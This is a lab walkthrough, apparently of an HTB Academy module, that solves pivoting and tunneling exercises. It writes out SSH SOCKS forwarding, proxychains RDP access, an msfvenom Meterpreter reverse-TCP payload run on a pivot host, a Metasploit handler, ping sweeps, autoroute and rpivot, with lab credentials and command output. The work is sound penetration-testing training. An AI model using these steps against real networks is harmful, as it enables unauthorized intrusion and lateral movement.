## Pivoting, Tunneling, and Port Forwarding   
Once a foothold is gained during an assessment, it may be in scope to move laterally and vertically within a target network. Using one compromised machine to access another is called pivoting and allows us to access networks and resources that are not directly accessible to us through the compromised host. Port forwarding accepts the traffic on a given IP address and port and redirects it to a different IP address and port combination. Tunneling is a technique that allows us to encapsulate traffic within another protocol so that it looks like a benign traffic stream.

# Questions and Answers: 

## Dynamic Port Forwarding with SSH and SOCKS Tunneling

 *SSH with user "ubuntu" and password "HTB_@cademy_stdnt!"*

* **You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)**

I began by connecting to the SSH server using the following command:
```bash
ssh -D 9050 ubuntu@10.129.144.206
```
After successfully logging in, I enumerated the network interfaces with:
```bash
ubuntu@WEB01:~$ ifconfig

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.144.206  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb0:403a  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:403a  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:40:3a  txqueuelen 1000  (Ethernet)
        RX packets 1350  bytes 117241 (117.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 155  bytes 16860 (16.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb0:2f8  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:02:f8  txqueuelen 1000  (Ethernet)
        RX packets 99  bytes 8340 (8.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 52  bytes 3910 (3.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 352  bytes 27739 (27.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 352  bytes 27739 (27.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

* **Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.**


To verify that my pivot was functioning correctly, I ran the following Nmap command:

```bash
nmap -v -sV -p9050 localhost
```
The results confirmed that port 9050 was open and running tor-socks, indicating that the pivot was set up properly.

Next, I used Metasploit with ProxyChains to scan for RDP services:
```bash
proxychains msfconsole
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
set rhosts 172.16.5.19
run
```

The scan confirmed that RDP was enabled on 172.16.5.19:3389 with the following details:
```bash
Hostname: DC01
Domain: INLANEFREIGHT
FQDN: DC01.inlanefreight.local
OS Version: Windows Server 2019 (10.0.17763)
Network Level Authentication (NLA): Disabled
```

I then attempted to connect to the Windows host using ProxyChains and xfreerdp with the credentials HTB provided:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
The connection was successful, granting me access to the remote desktop. Navigating to the Desktop directory, I found the flag and retrieved it.

[![Screenshot-2025-03-03-083203.png](https://i.postimg.cc/BnSkc3gN/Screenshot-2025-03-03-083203.png)](https://postimg.cc/56rsbZDF)


## Remote/Reverse Port Forwarding with SSH

*SSH with user "ubuntu" and password "HTB_@cademy_stdnt!"*
* **Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)**

To begin, I connected to the SSH server using dynamic port forwarding with the following command:
```bash
ssh -D 9050 ubuntu@10.129.142.166
```
Once connected, I enumerated the network interfaces using:
```bash
ubuntu@WEB01:~$ ifconfig

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.142.166  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb0:1692  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb0:1692  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:16:92  txqueuelen 1000  (Ethernet)
        RX packets 3733  bytes 311318 (311.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 294  bytes 26883 (26.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb0:8a2f  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:8a:2f  txqueuelen 1000  (Ethernet)
        RX packets 141  bytes 11147 (11.1 KB)
        RX errors 0  dropped 14  overruns 0  frame 0
        TX packets 128  bytes 9526 (9.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 697  bytes 54902 (54.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 697  bytes 54902 (54.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
The output revealed three interfaces, one of which was ens224, assigned the IP address **172.16.5.129**. This indicated that the machine was part of a private network that granted communication with the Windows server target

* **What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**

When setting up a listener (e.g., for a reverse shell, Meterpreter handler, or any other network service), `0.0.0.0` ensures that the service listens on all available network interfaces rather than a specific one.


## Meterpreter Tunneling & Port Forwarding

* **What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**

I connected to the SSH server using dynamic port forwarding with the following command:

```c
ssh -D 9050 ubuntu@10.129.135.184
```
Next, I generated a Meterpreter payload for the Ubuntu server using msfvenom:

```c
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.162 LPORT=8080 -f elf -o shell

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell

```

I ran the following command to copy the payload to the Ubuntu server using scp:
```c
scp /home/htb-ac-1310789/shell ubuntu@10.129.135.184:/home/ubuntu

ubuntu@10.129.135.184's password: 
shell                                                                                                                                                      100%  250    26.6KB/s   00:00
```

I then set up and started the multi/handler in Metasploit to listen for the reverse connection:
```c
msfconsole -q
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8080
lport => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 0.0.0.0:8080 
```

After that I executed the payload on the pivot host with following commands:

```c 
ubuntu@WEB01:~$ ls
shell
ubuntu@WEB01:~$ chmod +x shell
ubuntu@WEB01:~$ ./shell
```
This successfully initiated the reverse TCP connection, and we received a Meterpreter session:
```c
[*] Started reverse TCP handler on 0.0.0.0:8080 
[*] Sending stage (3045380 bytes) to 10.129.135.184
[*] Meterpreter session 1 opened (10.10.14.162:8080 -> 10.129.135.184:47350) at 2025-03-03 11:12:38 -0600
```

After obtaining the Meterpreter session, I ran a ping sweep on the Ubuntu server to identify other live hosts in the network range:
```c
Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
[*] Performing ping sweep for IP range 172.16.5.0/23
[+] 172.16.5.19 host found
[+] 172.16.5.129 host found
```

* **Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**

To enable routing to the subnet 172.16.5.0/23 through the compromised pivot host, I used the following Meterpreter command:

```c
run autoroute -s 172.16.5.0/23
```
The output indicated that the route was successfully added:

```c
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.135.184
```

## Web Server Pivoting with Rpivot

* **From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**

From reading the module we know we must run the server.py from the Attack Host.

* **From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**

From reading the module we know we must run the client.py from the Pivot Host.

 * **Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer**

I initiated the server.py script to listen for incoming connections from the pivot machine:

```c
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Next, I copied the rpivot directory to the pivot machine using scp:

```c
scp -r rpivot ubuntu@10.129.172.125:/home/ubuntu/
```

Once the files were transferred, I logged into the pivot machine using the provided HTB credentials:

```c
ssh ubuntu@10.129.172.125
```

Inside the pivot machine, I started the client.py script to establish a connection back to my attack machine:

```c
python2.7 client.py --server-ip 10.10.14.162 --server-port 9999
```

At this point, I attempted to access the target using proxychains with Firefox:
```c
proxychains firefox http://10.129.172.125
```

Instead, I used curl with the SOCKS proxy to directly access the target machine and retrieve the flag:
```c
curl --socks4 127.0.0.1:9050 172.16.5.135

--socks4 127.0.0.1:9050: Routes traffic through the SOCKS proxy established via rpivot.
```
[![Screenshot-2025-03-04-124019.png](https://i.postimg.cc/CMj0997p/Screenshot-2025-03-04-124019.png)](https://postimg.cc/yWY2ZQ2L)




